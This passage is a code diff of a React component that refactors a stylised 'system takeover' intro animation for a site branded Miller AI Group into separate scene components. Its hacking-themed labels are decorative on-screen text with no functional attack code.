-                  x={50}
-                  y={320}
-                  width={500}
-                  speed={50}
-                />
-              )}
-            </>
-          )}
-        </AnimatePresence>
+        {scene === 'terminal-takeover' && (
+          <TerminalTakeoverScene
+            key="terminal"
+            onComplete={() => handleSceneComplete('file-intrusion')}
+          />
+        )}
 
-        {/* Character reveal sequence */}
-        <AnimatePresence>
-          {phase === 'characters' && (
-            <CharacterReveal
-              character={CHARACTERS[currentCharacter]}
-              onComplete={handleCharacterComplete}
-            />
-          )}
-        </AnimatePresence>
+        {scene === 'file-intrusion' && (
+          <FileIntrusionScene
+            key="files"
+            onComplete={() => handleSceneComplete('character-briefing')}
+          />
+        )}
 
-        {/* System alerts */}
-        <AnimatePresence>
-          {alerts.map(alert => (
-            <SystemAlertPopup
-              key={alert.id}
-              alert={alert}
-              onDismiss={() => removeAlert(alert.id)}
-            />
-          ))}
-        </AnimatePresence>
+        {scene === 'character-briefing' && (
+          <CharacterBriefingScene
+            key="characters"
+            onComplete={() => handleSceneComplete('system-owned')}
+          />
+        )}
 
-        {/* Glitch effects */}
-        <AnimatePresence>
-          {glitchActive && <ScreenGlitchEffect active={glitchActive} intensity={glitchIntensity} />}
-        </AnimatePresence>
-
-        {/* Final takeover message */}
-        <AnimatePresence>
-          {phase === 'complete' && (
-            <motion.div
-              className="fixed inset-0 z-[70] flex items-center justify-center bg-black"
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-            >
-              <motion.div
-                className="text-center"
-                initial={{ scale: 0.5, opacity: 0 }}
-                animate={{ scale: 1, opacity: 1 }}
-                transition={{ type: 'spring' }}
-              >
-                <motion.div
-                  className="mb-8"
-                  animate={{
-                    boxShadow: [
-                      '0 0 60px rgba(255,0,255,0.3)',
-                      '0 0 120px rgba(255,0,255,0.6)',
-                      '0 0 60px rgba(255,0,255,0.3)',
-                    ],
-                  }}
-                  transition={{ duration: 1, repeat: Infinity }}
-                >
-                  <Image
-                    src="/logos/miller-ai-group.png"
-                    alt="Miller AI Group"
-                    width={120}
-                    height={120}
-                    className="mx-auto rounded-2xl"
-                  />
-                </motion.div>
-                <h1
-                  className="text-5xl font-bold font-mono mb-4"
-                  style={{
-                    color: '#ff00ff',
-                    textShadow: '0 0 30px rgba(255,0,255,0.8)',
-                  }}
-                >
-                  <GlitchText intensity={0.5}>SYSTEM COMPROMISED</GlitchText>
-                </h1>
-                <p className="text-xl font-mono text-green-400 mb-2">
-                  Welcome, {userName}
-                </p>
-                <p className="text-sm font-mono text-neutral-500">
-                  You are now part of Miller AI Group
-                </p>
-              </motion.div>
-            </motion.div>
-          )}
-        </AnimatePresence>
-
-        {/* Progress indicator */}
-        <div className="absolute bottom-4 left-4 right-4 z-30">
-          <div className="flex items-center gap-2 mb-2">
-            {['init', 'breach', 'characters', 'extraction', 'final'].map((p, i) => (
-              <motion.div
-                key={p}
-                className="h-1 flex-1 rounded-full"
-                style={{
-                  background: ['init', 'breach', 'characters', 'extraction', 'final'].indexOf(phase) >= i
-                    ? '#ff00ff'
-                    : 'rgba(255,255,255,0.1)',
-                }}
-                animate={phase === p ? { opacity: [0.5, 1, 0.5] } : {}}
-                transition={{ duration: 0.5, repeat: Infinity }}
-              />
-            ))}
-          </div>
-          <p className="font-mono text-xs text-fuchsia-400 text-center">
-            {phase === 'init' && 'INITIALIZING BREACH...'}
-            {phase === 'breach' && 'ESCALATING PRIVILEGES...'}
-            {phase === 'characters' && `DEPLOYING OPERATIVE ${currentCharacter + 1}/${CHARACTERS.length}...`}
-            {phase === 'extraction' && 'EXTRACTING DATA...'}
-            {phase === 'final' && 'COMPLETING TAKEOVER...'}
-            {phase === 'complete' && 'ACCESS GRANTED'}
-          </p>
-        </div>
-      </div>
-    </ScreenShakeEffect>
+        {scene === 'system-owned' && (
+          <SystemOwnedScene
+            key="owned"
+            userName={userName}
+            onComplete={() => handleSceneComplete('complete')}
+          />
+        )}
+      </AnimatePresence>
+    </div>
   )
 }
 
-export { CHARACTERS }
 export type { CinematicTakeoverProps }
